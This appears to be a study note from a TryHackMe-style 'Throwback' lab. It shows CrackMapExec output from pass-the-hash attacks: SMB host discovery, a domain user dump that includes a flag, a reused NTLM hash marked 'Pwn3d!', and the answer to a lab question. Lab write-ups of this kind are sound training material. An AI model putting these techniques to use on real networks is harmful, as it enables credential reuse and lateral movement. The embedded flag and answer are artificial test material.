# Good intentions, Courtesy of Microsoft
- After we have managed to gather some footholds and credentials on the network, the first thing we do is to use `pass the hash` with them.
- This checks each IP and validates the credentials.
- You need to start practicing the hash from Task 20 and Task 10.


### Pass-the-hash attacks
[Read here for my notes](obsidian://open?vault=THM%20Networks&file=Knowledge%20Base%2FPass-The-Hash%2FPass-The-Hash%20Attack)


#### Crackmapexec Enumeration if any SMB ports open on subnet
```
SMB         10.200.34.117   445    THROWBACK-DC01   [*] Windows 10.0 Build 17763 x64 (name:THROWBACK-DC01) (domain:THROWBACK.local) (signing:True) (SMBv1:False)

SMB         10.200.34.176   445    THROWBACK-TIME   [*] Windows 10.0 Build 17763 x64 (name:THROWBACK-TIME) (domain:THROWBACK.local) (signing:False) (SMBv1:False)

SMB         10.200.34.219   445    THROWBACK-PROD   [*] Windows 10.0 Build 17763 x64 (name:THROWBACK-PROD) (domain:THROWBACK.local) (signing:False) (SMBv1:False)

SMB         10.200.34.222   445    THROWBACK-WS01   [*] Windows 10.0 Build 19041 x64 (name:THROWBACK-WS01) (domain:THROWBACK.local) (signing:False) (SMBv1:False)

```


#### We can also pass the hash for `BlaireJ` (as he is a user on the DC) to the domain controller, so we can also start #Crackmapexec enumeration on the Domain Controller without even pwing it!

1. Enumerating Users
```
SMB         10.200.34.117   445    THROWBACK-DC01   [+] Enumerated domain user(s)
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\Administrator                  Built-in account for administering the computer/domain
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\krbtgt                         Key Distribution Center Service Account
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\WEBService                     Web Server Service Account
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\FoxxR                          
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\WintersS                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\BlaireJ                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\sshd                           
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\SQLService                     
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\DaibaN                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\StuartL                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\TBService                      
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\LoginService                   
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\STAGEService                   
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\WhiteR                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\GuthrieA                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\CochranH                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\BurtonV                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\PowellW                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\NievesD                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\CastroJ                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\PooleW                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\AtkinsB                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\HamptonF                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\HaydenC                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\QuinnC                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\RosalesT                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\PetersenA                      
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\EatonR                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\LivingstonM                    
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\GongoH                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\FoleyS                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\BoyerV                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\JacobsonD                      
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\NixonJ                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\WebbH                          
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\LindseyN                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\ParkerL                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\SextonL                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\AndersonD                      
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\SpenceJ                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\SosaL                          
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\NealR                          
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\BaldwinB                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\BlackwellA                     
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\TrevinoC                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\KramerP                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\ClayS                          
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\MontoyaI                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\BrenardJ                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\ThortonD                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\BlackenshipV                   
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\CortezD                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\WilliamsonM                    
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\HansonsW                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\LambJ                          
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\StanleyL                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\CunninghamS                    
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\PateD                          
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\HardingE                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\WilkinsonE                     
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\BrooksK                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\DotsonJ                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\BentonA                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\BurchR                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\spooks                         
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\JeffersD                       
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\PetersJ                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\HumphreyW                      
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\horsemanb                      
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\TaskMgr                        
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\MercerH                        TBH{b89d9a1648b62a7f2ed01038ac47796b}
SMB         10.200.34.117   445    THROWBACK-DC01   THROWBACK.local\backup
```


### Pass-The-Hash results for WS01
```
SMB         10.200.34.219   445    THROWBACK-PROD   [*] Windows 10.0 Build 17763 x64 (name:THROWBACK-PROD) (domain:THROWBACK.local) (signing:False) (SMBv1:False)

THROWBACK-WS01   [*] Windows 10.0 Build 19041 x64 (name:THROWBACK-WS01) (domain:THROWBACK.local) 

SMB         10.200.34.219   445    THROWBACK-PROD   [+] THROWBACK.local\BlaireJ:c374ecb7c2ccac1df3a82bce4f80bb5b (Pwn3d!)

SMB         10.200.34.222   445    THROWBACK-WS01   [+] THROWBACK.local\BlaireJ:c374ecb7c2ccac1df3a82bce4f80bb5b 
```
- Here we see that we can authenticate ourself by passing the hash to `THROWBACK-WS01` machine. Which means out attack was successful and we successfuly passed the hash to another machine on the network.



## Questions

1. What two users could successfully pass the hash to THROWBACK-WS01? (In alphabetical order)
`BlaireJ, HumphreyW`

